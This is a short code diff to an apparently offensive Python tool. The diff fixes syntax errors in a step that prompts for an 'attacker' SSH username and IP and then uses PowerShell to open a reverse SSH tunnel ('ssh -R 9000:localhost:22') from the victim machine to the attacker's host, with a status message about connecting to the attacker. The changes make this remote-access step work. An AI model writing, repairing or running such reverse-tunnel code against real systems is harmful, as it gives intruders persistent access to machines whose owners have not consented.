@@ -135,10 +135,10 @@ while True:
             attackeruser=input("Enter attacker SSH username: ")
             attackerip=input("Enter attacker IP (without port): ")
         
-            ssh_tunnel="ssh -R 9000:localhost:22 "+attackeruser"@"+attackerip
-            subprocess.run(["powershell", "-Command", ssh_tunnel] check=True)
+            ssh_tunnel="ssh -R 9000:localhost:22 "+attackeruser+"@"+attackerip
+            subprocess.run(["powershell", "-Command", ssh_tunnel], check=True)
             cls()
-            print(Fore.YELLOW + "Attempting to connect to attacker on " + sshuser)
+            print(Fore.YELLOW + "Attempting to connect to attacker on " + attackerip)
             sleep(1)
         else:
             print(" ")
